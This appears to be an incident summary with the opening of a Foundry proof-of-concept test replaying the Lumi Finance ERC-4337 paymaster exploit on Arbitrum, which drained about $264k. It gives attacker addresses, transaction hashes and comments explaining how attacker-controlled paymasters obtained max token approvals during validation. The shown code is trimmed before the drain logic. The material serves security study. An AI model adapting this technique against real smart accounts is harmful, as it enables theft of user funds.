# [?] Lumi Finance - ERC-4337 Validation-Phase Paymaster Approval

## Summary
Severity: Unknown
Chain: Arbitrum
Component: LumiFinance
Published: 2026-07-14
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-07/LumiFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~264,000 USD

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Lumi Finance (Sodium smart account) — ERC-4337 paymaster validation-phase approval side-effect
// ~$264k on Arbitrum. An attacker-controlled paymaster caused Sodium smart accounts to grant
// max ERC20 allowances to the attacker's contract DURING UserOp validation (no user intent),
// then those allowances were batch-drained.
//
// Approval tx : 0x630654fb1c8914405cf81bb02f091b049f19403a152f624f7b8a00c7724c6604  (block 483389834)
//   attacker EOA -> 0x5636... (attacker batch contract) . 0x363e464b(address[] victims,address[] tokens)
//   -> internally calls EntryPoint v0.6 handleOps; each victim account approves 0x5636... for max.
// Sweep tx    : 0x020995ec0b5daafe8fab481e33b1b52fdbd6423578060a1f73fd2a9b9fb0ea90  (block 483390715)
//   same contract, 0x96e676e5(address[],address[]) — DIFFERENT victim batch. Not replayed here
//   (its batch isn't approved yet at the approval-block fork); we drain the approval batch directly.
//
// This is a forensic replay of a public, already-executed incident at a historical fork block.
//
// Run:
//   forge test --contracts ./src/test/2026-07/LumiFinance_exp.sol --evm-version cancun -vvv
//   Requires an ARCHIVE Arbitrum RPC (Alchemy works) mapped to the `arbitrum` rpc alias.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract LumiFinanceExp is Test {
    // Attacker's batching contract == the approved spender (from the Approval logs' topic2).
    address constant SWEEPER  = 0x56362412AE17cac443AAFBAb4289946Ad958E8a1;
    address constant ATTACKER = 0xCe1a3BB0b98D0D90C7Dd0620Ab86C9A771888d88;
    // EntryPoint v0.6, confirmed from the UserOperationEvent emitter in the receipt.
    address constant ENTRYPOINT_V06 = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-07/LumiFinance_exp.sol_
